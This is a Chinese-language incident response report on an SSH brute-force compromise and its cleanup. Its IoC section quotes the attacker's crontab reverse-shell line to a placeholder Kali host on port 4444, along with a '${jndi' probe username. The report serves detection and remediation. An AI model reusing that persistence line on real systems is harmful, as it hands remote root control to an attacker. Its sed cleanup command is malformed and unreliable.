网络安全应急响应报告
一、事件概述
内网IP 192.168.XXX.XXX对本机服务器发起SSH口令暴力破解攻击，攻击者成功获取主机权限，入侵后植入两类持久化后门：
一是创建后门账号`hacker`用于长期登录；二是写入定时任务，每30分钟以root权限自动反弹Shell连接Kali攻击机。
应急团队严格遵循PDCERF六阶段应急响应模型，完成证据取证、流量遏制、恶意后门根除、系统安全加固、事件复盘全流程处置，
当前所有入侵痕迹已彻底清除，服务器业务安全稳定运行。

二、事件时间线（PDCERF六阶段）
1. P 准备阶段**
服务器常态化开启系统日志审计、进程监控、网络连接记录功能，定期梳理主机资产与运行服务，具备安全事件应急处置基础条件。
2. D 检测阶段（事件发现）**
管理员核查`/var/log/auth.log`认证日志，发现内网IP持续SSH爆破扫描行为；进一步巡检系统账户列表时，发现非授权后门账户`hacker`；
核查计划任务`/etc/crontab`，捕获周期30分钟的反弹Shell持久化后门，综合判定服务器已被攻击者完全入侵控制。
同步完成登录历史、临时目录、系统进程全维度痕迹勘查。
3. C 遏制阶段（先取证，后处置）**
导出进程快照、网络连接记录、系统登录日志作为电子取证文件；防火墙封禁攻击源IP阻断外部访问；暂停定时任务，阻止反弹Shell定时外联；
终止正在运行的恶意外联进程，切断攻击者实时控制通道。
4. E 根除阶段（清除恶意载荷）**
清理crontab内反弹Shell定时后门；执行删除命令彻底移除后门账户`hacker`；核查清除攻击者留存的SSH非法公钥；
排查临时目录，清理全部可疑恶意文件，消除所有持久化入侵通道。
5. R 恢复阶段（业务恢复）**
重启定时任务、SSH核心服务；加固SSH登录配置，关闭root账号密码登录，防范再次暴力破解；核验全量服务运行状态，确认无异常主动外联行为。
6. F 跟进复盘阶段**
完整复盘SSH爆破入侵完整攻击链路，梳理服务器安全短板；更新日常安全巡检清单，新增系统账号、定时任务专项核查项；
优化应急预案，完善后门账号、反弹Shell类入侵事件处置流程。

## 三、事件研判与IoC攻击特征清单
1. 攻击源IP：192.168.XXX.XXX
2. 攻击方式：SSH弱口令暴力破解入侵
3. 恶意行为清单：
    1. 使用畸形无效用户名 `${jndi` 批量发起SSH登录爆破；
    2. 爆破成功获取主机权限，创建后门登录账户`hacker`；
    3. 在系统计划任务写入持久化后门：`*/30 * * * * root /bin/bash -i >& /dev/tcp/Kali攻击IP/4444 0>&1`，
       每30分钟主动反弹root权限Shell至攻击机；
4. 风险影响：攻击者拥有长期登录、远程完全控制服务器权限，存在窃取本地数据、植入勒索病毒、内网横向渗透、破坏业务系统等高严重安全风险。

## 四、详细处置过程
### 1、检测阶段（Detect）
1. 登录历史核查：执行`last`查看登录记录，仅存在本地用户demon、合法远程SSH用户lucky正常登录记录；
多条日志标记`crash`，为服务器过往非正常关机记录，与本次入侵无直接关联。
2. SSH认证日志分析：读取`/var/log/auth.log`，2026-07-29 21:06 IP 192.168.117.128发起爆破，尝试不存在用户 `${jndi`，
后续出现成功登录记录，证明攻击者突破SSH防护进入系统；7月30日本地用户demon执行sudo命令检索失败登录日志，属于管理员正常自查操作。
3. 系统账户排查：执行`cat /etc/passwd | grep -E "/bin/bash|/bin/sh"`筛选可交互式登录账号，列表内除root、合法用户demon外，
额外出现陌生账户`hacker`，判定为攻击者新建后门账号。
4. 定时任务排查：读取`/etc/crontab`，发现恶意定时脚本，每30分钟以root权限主动向外建立反弹Shell连接，实现无间断持久控制。
5. 临时目录核查：执行`ls -la /tmp`，目录内均为VMware虚拟机组件、X图形桌面系统临时文件、锁文件，未发现shell.php等WebShell恶意脚本。
6. 进程状态排查：绝大多数进程为Ubuntu系统原生服务、VMware配套进程；nobody用户运行OpenVPN服务端，标记为待复核风险点；
未发现nc、python等实时反弹Shell恶意进程。

综合判定：服务器遭受SSH暴力破解入侵，攻击者留存账户后门与定时反弹Shell双重持久化通道，存在高危安全隐患。

### 2、遏制阶段（Contain）
严格遵循**先取证、后处置**的取证优先原则：
1. 固定电子证据，留存入侵原始痕迹：
```bash
ps aux > /tmp/证据_进程.txt
sudo netstat -anp > /tmp/证据_网络.txt
sudo tail -200 /var/log/auth.log > /tmp/证据_日志.txt
```
2. 阻断攻击入口：执行`sudo iptables -A INPUT -s 攻击IP -j DROP`封禁爆破IP，阻止攻击者再次接入服务器。
3. 抑制后门执行：执行`sudo systemctl stop cron`暂停定时任务，避免反弹Shell定时主动外联攻击机；查杀并终止当前恶意外联进程，
切断实时控制通道。

### 3、根除阶段（Eradicate）
全方位清理全部入侵持久化后门，彻底消除风险：
1. 删除定时反弹Shell后门任务：
sudo sed -i 'Kali攻击IP/4444/d' /etc/crontab
2. 彻底移除后门账户hacker（同步删除家目录、缓存文件，无残留）：
sudo userdel -r hacker
3. 核查root家目录SSH信任密钥文件/root/.ssh/authorized_keys，删除攻击者上传的非法公钥后门。
4. 清理本次应急产生的取证临时文件，二次复核`/tmp`目录无残留恶意载荷。

### 4、恢复阶段（Recover）
1. 恢复系统基础服务正常运行：
sudo systemctl start cron
sudo systemctl restart ssh
2. SSH远程登录安全加固：修改/etc/ssh/sshd_config配置，将PermitRootLogin yes调整为PermitRootLogin prohibit-password，
关闭root账号密码登录，从源头抵御SSH暴力扫描。
3. 服务状态核验：执行systemctl status ssh确认远程登录服务稳定运行；持续监控网络外联流量，无异常主动对外连接行为。

### 5、跟进阶段（Follow-up）
1. 攻击链路复盘：攻击者依靠SSH弱口令爆破入侵主机，先后创建后门登录账号、写入定时反弹Shell双重持久化后门，
实现长期、高权限控制系统，完整攻击链路清晰；
2. 潜在风险复核：核查OpenVPN服务配置文件，确认是否为管理员授权部署，消除隐蔽远程访问通道隐患；
3. 巡检机制优化：新增每日自动化巡检项：可登录系统账户列表、全量定时任务、服务器主动外联TCP连接、SSH失败登录日志；
更新应急处置预案，针对后门账号、反弹Shell制定标准化处置流程。

## 五、根因分析
1. SSH服务开启root密码登录，系统账户使用弱口令，未配置登录失败锁定策略，极易被自动化爆破工具攻破；
2. 未常态化巡检/etc/passwd系统账户清单，无法及时发现攻击者新建后门账号；
3. 缺少定时任务定期审计机制，未能第一时间捕获反弹Shell持久化后门；
4. 内网无访问控制策略，内网任意主机均可直接访问服务器22 SSH端口；
5. 未部署外联流量监控，无法实时察觉主机主动向外建立恶意反弹连接。

## 六、整改建议
### 短期整改（立即落地执行）
1. 关闭SSH root账号密码登录，重置所有系统账户高强度独立密码；
2. 防火墙永久封禁爆破IP 192.168.XXX.XXX；
3. 核查OpenVPN服务合法性，非授权部署则停止并完全卸载；
4. 实时监控服务器主动外联TCP连接，防止新增反弹类后门。

### 中期整改（7日内完成）
1. 启用SSH密钥登录模式，彻底关闭密码认证；配置sshd登录失败自动锁定策略；
2. 部署日志实时告警，监控高频SSH失败登录、新增系统用户、定时任务变更行为；
3. 每周自动化巡检三项核心内容：系统可登录账户、crontab定时任务、/tmp临时目录可疑文件。

### 长期整改（常态化安全建设）
1. 内网划分安全区域，防火墙配置访问控制策略，限制非信任主机访问22 SSH端口；
2. 落实账号最小权限原则，定期开展服务器安全基线全面核查；
3. 定期组织网络安全应急演练，强化后门账号、反弹Shell类入侵事件处置能力。

## 七、处置结论
本次SSH暴力破解入侵事件已完成全流程闭环处置，后门账户hacker、30分钟周期反弹Shell定时任务、潜在SSH密钥后门等全部入侵痕迹彻底清除，
攻击源IP已永久封禁，SSH远程服务完成安全加固。服务器无残留恶意程序、无数据泄露风险，全部业务稳定运行。
本次应急响应完善了主机常态化安全巡检机制，大幅提升持久化后门类入侵事件的识别、取证、根除处置能力。
